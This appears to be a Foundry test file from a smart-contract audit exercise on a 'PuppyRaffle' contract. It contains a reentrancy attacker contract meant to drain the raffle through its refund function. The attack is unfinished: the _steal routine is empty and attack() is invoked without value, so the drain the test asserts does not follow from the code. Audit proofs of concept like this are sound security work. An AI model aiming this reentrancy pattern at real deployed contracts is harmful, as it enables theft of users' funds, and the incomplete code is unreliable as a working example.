// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    ////////////////////////////////////////////////////////////
    ////////////   reentrancy tests  ///////////////////////////
    ////////////////////////////////////////////////////////////

    function test_ReentranctyInRefund() public playersEntered {
        // arrange
        // address[] memory players = new address[](4);
        // players[0] = playerOne;
        // players[1] = playerTwo;
        // players[2] = playerThree;
        // players[3] = playerFour;
        // puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // initialize the contract
        ReentrancyAttackerContract attackerContract = new ReentrancyAttackerContract(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, entranceFee);
        uint256 attackerContractBalanceBefore = address(attackerContract).balance;
        uint256 puppyRaffleContractBalanceBefore = address(puppyRaffle).balance;

        // attack!  steal monies!!!
        vm.prank(attacker);
        attackerContract.attack();
        console.log("attacker contract balance after attack", address(attackerContract).balance);
        console.log("puppy raffle contract balance after attack", address(puppyRaffle).balance);

        // assert
        assertEq(address(attackerContract).balance, puppyRaffleContractBalanceBefore + attackerContractBalanceBefore);
        assertEq(address(puppyRaffle).balance, 0);
    }
}

contract ReentrancyAttackerContract {
    PuppyRaffle puppyRaffle;
    uint256 public s_entranceFee; // we'll get this from calling puppyRaffle.entranceFee()
    uint256 public s_attackerIndex;

    constructor(PuppyRaffle _puppyRaffleInstance) {
        puppyRaffle = _puppyRaffleInstance; // Initializing the state variable
        s_entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        // get the attacker in and call refund
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        puppyRaffle.enterRaffle{value: s_entranceFee}(attackers);
        s_attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(s_attackerIndex);
    }

    function _steal() internal {}

    receive() external payable {
        _steal();
    }

    fallback() external payable {
        _steal();
    }
}
